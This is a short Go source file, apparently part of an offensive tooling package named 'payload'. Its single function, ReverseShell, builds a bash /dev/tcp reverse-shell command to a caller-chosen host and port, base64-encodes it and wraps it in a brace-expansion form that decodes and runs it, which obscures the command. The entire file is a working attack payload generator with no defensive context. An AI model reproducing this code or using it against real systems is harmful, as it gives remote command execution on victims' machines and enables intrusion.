package payload

import (
	"encoding/base64"
	"fmt"
)

func ReverseShell(host string, port string) string {
	command := fmt.Sprintf("/bin/bash -i >& /dev/tcp/%v/%v 0>&1", host, port)
	b64command := base64.StdEncoding.EncodeToString([]byte(command))
	return fmt.Sprintf("bash -c {echo,%v}|{base64,-D}|{bash,-i}", b64command)
}
